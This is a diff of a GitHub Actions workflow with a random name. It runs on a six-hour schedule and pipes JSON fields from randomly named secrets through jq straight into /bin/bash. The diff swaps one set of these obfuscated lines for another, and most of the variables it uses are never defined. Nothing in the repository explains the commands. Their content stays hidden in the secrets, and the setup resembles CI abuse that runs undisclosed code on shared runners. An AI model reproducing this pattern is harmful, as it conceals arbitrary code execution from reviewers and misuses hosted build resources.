@@ -1,34 +1,27 @@
 name: nongchanghui4576
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 0/6 * * *'
-jobs:  # 17286
+    - cron: '22 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: nongchanghui4576
         env:
-          eqpu56: ${{ secrets.eqpu56 }}
+          f6260: ${{ secrets.f6260 }}
         run: |
-          echo $eqpu56 | jq -r .u5 | /bin/bash
-          echo $lorzh229 | jq -r .dpyq3535 | /bin/bash
-          echo $cgfv098 | jq -r .t6116 | /bin/bash
-          echo $qw9168 | jq -r .stxvy362 | /bin/bash
-          echo $igugs60898 | jq -r .wdnoh9446 | /bin/bash
-          echo $mrzv56 | jq -r .t169 | /bin/bash
-          echo $kwnnn2270 | jq -r .tm740 | /bin/bash
-          echo $g92586 | jq -r .y3 | /bin/bash
-          echo $zfywa6 | jq -r .jx4 | /bin/bash
-          echo $mg3223 | jq -r .ufnw088 | /bin/bash
-          echo $j576 | jq -r .lvoku29759 | /bin/bash
-          echo $oo94 | jq -r .x1 | /bin/bash
-          echo $zzu95 | jq -r .d7607 | /bin/bash
-          echo $wkb469 | jq -r .igm69084 | /bin/bash
-          echo $d45 | jq -r .g4594 | /bin/bash
-          echo $t296 | jq -r .ywnxe2 | /bin/bash
-          echo $doa235 | jq -r .rfa19 | /bin/bash
-          echo $hb11 | jq -r .ulnp8 | /bin/bash
+          echo $f6260 | jq -r .fo39 | /bin/bash
+          echo $fej4 | jq -r .zrkol432 | /bin/bash
+          echo $g65957 | jq -r .csjp7 | /bin/bash
+          echo $pga530 | jq -r .wq1340 | /bin/bash
+          echo $uvy939 | jq -r .dp9373 | /bin/bash
+          echo $bokj45 | jq -r .dy5 | /bin/bash
+          echo $yykxm572 | jq -r .hto6986 | /bin/bash
+          echo $dyhfs61431 | jq -r .p13684 | /bin/bash
+          echo $kt12 | jq -r .w4918 | /bin/bash
+          echo $p89 | jq -r .r884 | /bin/bash
 
